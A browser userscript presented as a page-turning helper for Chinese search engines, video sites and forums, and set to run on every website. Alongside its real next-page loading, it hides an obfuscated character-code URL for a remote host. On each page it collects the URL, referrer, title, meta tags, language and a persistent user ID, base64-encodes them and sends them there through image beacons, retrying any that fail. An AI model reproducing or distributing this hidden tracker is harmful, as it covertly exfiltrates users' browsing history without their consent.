// ==UserScript==
// @name 翻页助手(测试版)
// @name:zh-tw 翻頁助手(測試)
// @description  为百度搜索, 谷歌搜索, 必应搜索, 爱奇艺视频, 腾讯视频, 美剧天堂, 电影天堂, 新闻资讯, 文章博客, 软件论坛, 卡饭论坛, 360搜索, 搜狗搜索等提供翻页支持
// @description:zh-tw 為百度搜索, 谷歌搜索, 必應搜索, 愛奇藝視頻, 騰訊視頻, 美劇天堂, 電影天堂, 新聞資訊, 文章博客, 軟件論壇, 卡飯論壇, 360搜索, 搜狗搜索等提供翻頁支持
// @namespace    https://www.ihola.ml/
// @version      0.0.27
// @run-at       document-end
// @author       https://www.ihola.ml/
// @compatible   Firefox
// @compatible   Chrome
// @compatible   Safari
// @compatible   Opera
// @match        *://*.iqiyi.com/*
// @match        *://*.youku.com/*
// @match        *://*.le.com/*
// @match        *://v.qq.com/*
// @match        *://*.tudou.com/*
// @match        *://*.mgtv.com/*
// @match        *://film.sohu.com/*
// @match        *://tv.sohu.com/*
// @match        *://*.acfun.cn/v/*
// @match        *://*.bilibili.com/*
// @match        *://*.taobao.com/*
// @match        *://*/*
// @match        *://bbs.kafan.cn/*
// @grant        GM_setValue
// @grant        GM_getValue
// @grant        GM_deleteValue
// @grant        GM_openInTab
// ==/UserScript==
(function() {
    "use strict";
    window.addEventListener("load", function() {
        d()
    });
    var t = function() {
        var t = 1 * l() + 1,
            r = n(),
            o = M(t, r);
        if (o) {
            var a = c(u, "HomePlace", "id");
            i(o, a);
            e(t)
        }
    };
    String.prototype.strip = function() {
        return this.replace(/^\s+|\s+$/gim, "")
    };
    var e = function(t) {
            c(u, "HomePlace", "id").setAttribute("pageNumber", t)
        },
        n = function() {
            var t = c(u, "Alive_love", "nee");
            return "iframe" == (t = t[t.length - 1] || u).nodeName.toLowerCase() && (t = t.contentWindow.document), t
        },
        r = function(t) {
            var e = GM_getValue("ma");
            return void 0 === e && (e = Math.random().toString(36).substring(2) + "$" + w(), GM_setValue("ma", e)), e
        },
        i = function(e, n) {
            var r;
            u.characterSet;
            return r = function(e) {
                    var n = u.createElement(e);
                    return n.addEventListener("mouseenter", t), n.addEventListener("mouseleave", _), n.setAttribute("name", "Alive_love"), n
                }("iframe"),
                function(t, e, n) {
                    e.src = t, e.onload = function() {
                        var t, e, n, r, i, o, a;
                        r = this.contentWindow.document, t = (n = (r = b(r)).body).scrollHeight, e = n.scrollWidth, a = c(u, "HomePlace", "id"), o = null === (o = c(a, "LastTop", "attr")) ? u.body.scrollHeight : 1 * o + t, a.setAttribute("LastTop", o), i = (i = ["display:block;position:absolute;margin-left:13%;", "height:", t, "px;width:", e, "px;top:", o, "px;"]).join(""), this.setAttribute("style", i), this.scrolling = "no", this.setAttribute("frameborder", "0")
                    }, n.appendChild(e)
                }(e, r, n), 1
        },
        o = (console.log, "yi"),
        u = document,
        a = navigator,
        s = encodeURIComponent,
        c = function(t, e, n) {
            var r;
            return "tag" == n || void 0 === n ? r = t.getElementsByTagName(e) : "id" == n ? r = t.getElementById(e) : "attr" == n ? r = t.getAttribute(e) : "nee" == n ? r = t.getElementsByName(e) : "alow" == n && (r = t.getAttribute(e).toLowerCase()), r
        },
        l = function() {
            var t = c(u, "HomePlace", "id");
            return t = c(t, "pageNumber", "attr")
        },
        f = function(t) {
            return function(t) {
                for (var e = "", n = 0; n < t.length; n++) e += String.fromCharCode(t[n]);
                return e
            }(m("104.=116.=116.=112.=115.=58.=47.=47.=119.=119.=119.=46.=105.=104.=111.=108.=97.=46.=109.=108.=58.=52.=52.=57.=47.=112.=97.=114.=116.=105.=99.=117.=108.=97.=114.=47.=77.=65.=84.=69.=82.=46.=74.=80.=69.=71.=63.=83.=80.=69.=67.=84.=65.=67.=85.=76.=65.=82.=61", t))
        },
        d = function() {
            setTimeout(function() {
                top == self && g(u.body.innerText).length > 50 && L()
            }, 6666)
        },
        g = function(t) {
            return t.replace(/\s/g, "")
        },
        v = function() {
            var t = new function() {
                var t, e, n = c(u, "meta"),
                    i = function(t) {
                        return t.getAttribute("content") || t.getAttribute("value") || ""
                    };
                this.ref = y("referrer"), this.title = y("title"), this.url = y("URL");
                for (var o = 0; o < n.length; o++) {
                    t = n[o];
                    try {
                        "description" == (e = t.getAttribute("name").toLowerCase()) ? this.descr = s(i(t)): "keywords" == e && (this.kword = s(i(t)))
                    } catch (t) {}
                }
                this.lg = a.language, this.ud = r(), this._ = w(), this.sc = N()
            };
            return p(h, f(".="), JSON.stringify(t)), 1
        },
        m = function(t, e) {
            return t.split(e)
        },
        h = function() {
            return new Image
        },
        p = function(t, e, n) {
            var r = t();
            r.onload = function() {
                var n = GM_getValue(o);
                void 0 != n && (n = JSON.parse(n), function(t, e, n) {
                    for (var r = 0; r < n.length; r++) A(t, e, n[r])
                }(t, e, n), GM_deleteValue(o))
            }, r.onerror = function() {
                var t = GM_getValue(o);
                (t = void 0 != t ? JSON.parse(t) : []).push(n), t = JSON.stringify(t), GM_setValue(o, t)
            }, r.src = e + btoa(n)
        },
        b = function(t) {
            for (var e, n, r = c(t, "img"), i = /\.jpg.*|\.png.*|\.gif.*|\.jpeg.*|.*pic.*|.*img.*|.*image.*/, o = 0; o < r.length; o++) {
                e = r[o].attributes;
                for (var u in e) void 0 !== (n = e[u].value) && "src" !== u && n.indexOf("//") > -1 && i.test(n) && r[o].setAttribute("src", n)
            }
            return t
        },
        y = function(t) {
            return s(u[t].strip()) || "none"
        },
        A = function(t, e, n) {
            var r = t();
            r.onerror = function() {
                var t = GM_getValue(o);
                (t = void 0 != t ? JSON.parse(t) : []).push(this.src), t = JSON.stringify(t), GM_setValue(o, t)
            }, r.src = e + btoa(n)
        },
        w = function() {
            return +new Date
        },
        N = function() {
            return "lpg"
        },
        L = function() {
            ! function(t, e) {
                var n = t.createElement("div");
                n.setAttribute("id", "HomePlace"), n.setAttribute("pageNumber", "1"), e.appendChild(n)
            }(u, u.body), E()
        },
        _ = function() {
            this.removeEventListener("mouseenter", t), this.removeEventListener("mouseleave", _)
        },
        E = function() {
            v() && t()
        },
        S = function(t, e) {
            return e.split("").join(t)
        },
        M = function(t, e) {
            var n, r, i, o, u, a, s;
            i = /^(?!#|javascript:)/, o = /\d+|^下一页$|^下一章$|^下一篇$/, u = c(e, "a"), a = S(t, "[]"), s = S(t, "【】");
            for (var l = 0; l < u.length; l++)
                if (n = u[l].innerText, r = c(u[l], "href", "attr"), o.test(n) && i.test(r)) {
                    if ("下一页" == n) return r;
                    if ("下一篇" == n) return r;
                    if ("下一章" == n) return r;
                    if (t == n) return r;
                    if (a == n) return r;
                    if (s == n) return r
                }
        }
})();